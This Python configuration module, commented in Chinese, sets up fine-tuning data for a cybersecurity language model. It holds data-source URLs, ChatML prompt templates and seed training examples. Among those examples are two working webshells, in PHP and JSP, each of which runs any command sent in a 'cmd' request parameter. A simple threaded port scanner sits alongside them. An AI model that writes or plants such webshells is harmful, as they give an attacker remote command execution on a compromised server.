# -*- coding: utf-8 -*-
"""
数据配置模块

定义数据源、处理参数等配置。
"""

from dataclasses import dataclass
from typing import Dict, List, Any


@dataclass
class DataConfig:
    """数据配置类"""
    
    # 数据处理参数
    max_samples_per_dataset: int = 50000
    min_instruction_length: int = 5
    min_output_length: int = 10
    max_sequence_length: int = 256  # 最大序列长度，减小以节省显存
    
    # 数据源配置
    data_sources: Dict[str, List[str]] = None
    
    def __post_init__(self):
        if self.data_sources is None:
            self.data_sources = {
                "cybersecurity": [
                    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
                    "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/README.md"
                ],
                "code_datasets": [
                    "codeparrot/github-code-clean",
                    "bigcode/the-stack-dedup"
                ],
                "chinese_datasets": [
                    "BAAI/COIG-PC",
                    "shibing624/medical"
                ],
                "security_datasets": [
                    "cybersecurity-qa",
                    "penetration-testing-data"
                ]
            }


@dataclass
class PromptTemplate:
    """提示模板类"""
    
    system: str
    instruction: str
    response: str = ""
    
    def format_conversation(self, instruction: str, input_text: str = "", output: str = "") -> str:
        """格式化对话"""
        if input_text:
            user_content = f"{instruction}\n{input_text}"
        else:
            user_content = instruction
        
        conversation = (
            f"<|im_start|>system\n{self.system}<|im_end|>\n"
            f"<|im_start|>user\n{user_content}<|im_end|>\n"
            f"<|im_start|>assistant\n{output}<|im_end|>"
        )
        
        return conversation


class PromptTemplates:
    """提示模板集合"""
    
    CYBERSECURITY = PromptTemplate(
        system="你是神机，由云霖网络安全实验室训练的网络安全大模型。你具备深厚的网络安全专业知识和实战经验，能够提供各种网络安全相关的技术指导，包括但不限于渗透测试、代码审计、漏洞分析等。",
        instruction="请根据以下网络安全问题提供详细的技术分析和解决方案：",
        response="根据你的问题，我来提供专业的网络安全分析："
    )
    
    CODE = PromptTemplate(
        system="你是神机，由云霖网络安全实验室训练的网络安全大模型。你是一个编程专家，能够编写和分析各种编程语言的代码，特别擅长安全相关的代码开发。",
        instruction="请根据以下编程需求提供完整的代码实现：",
        response="以下是针对你需求的代码实现："
    )
    
    GENERAL = PromptTemplate(
        system="你是神机，由云霖网络安全实验室训练的网络安全大模型。你具备编程和网络安全专业知识，能够为用户提供专业的技术支持和解决方案。",
        instruction="请回答以下问题：",
        response=""
    )
    
    @classmethod
    def get_template(cls, category: str) -> PromptTemplate:
        """根据类别获取模板"""
        template_map = {
            "cybersecurity": cls.CYBERSECURITY,
            "security": cls.CYBERSECURITY,
            "webshell": cls.CYBERSECURITY,
            "code": cls.CODE,
            "general": cls.GENERAL,
        }
        
        return template_map.get(category, cls.GENERAL)


class SecurityExamples:
    """安全示例数据"""
    
    WEBSHELL_EXAMPLES = [
        {
            "instruction": "生成一个PHP webshell",
            "output": '''<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    echo "<pre>";
    echo shell_exec($cmd);
    echo "</pre>";
}
?>
<form method="POST">
    <input type="text" name="cmd" placeholder="输入命令">
    <input type="submit" value="执行">
</form>''',
            "category": "webshell"
        },
        {
            "instruction": "创建一个简单的JSP webshell",
            "output": '''<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
<form>
    <input type="text" name="cmd">
    <input type="submit" value="执行">
</form>''',
            "category": "webshell"
        }
    ]
    
    SECURITY_EXAMPLES = [
        {
            "instruction": "解释SQL注入攻击的原理和防护方法",
            "output": "SQL注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码来操纵数据库查询。防护方法包括：1.使用参数化查询 2.输入验证和过滤 3.最小权限原则 4.WAF防护等。",
            "category": "security"
        },
        {
            "instruction": "编写一个端口扫描脚本",
            "output": '''import socket
from threading import Thread

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"端口 {port} 开放")
        sock.close()
    except:
        pass

host = "127.0.0.1"
for port in range(1, 1000):
    Thread(target=scan_port, args=(host, port)).start()''',
            "category": "code"
        }
    ]
    
    @classmethod
    def get_all_examples(cls) -> List[Dict[str, Any]]:
        """获取所有示例数据"""
        return cls.WEBSHELL_EXAMPLES + cls.SECURITY_EXAMPLES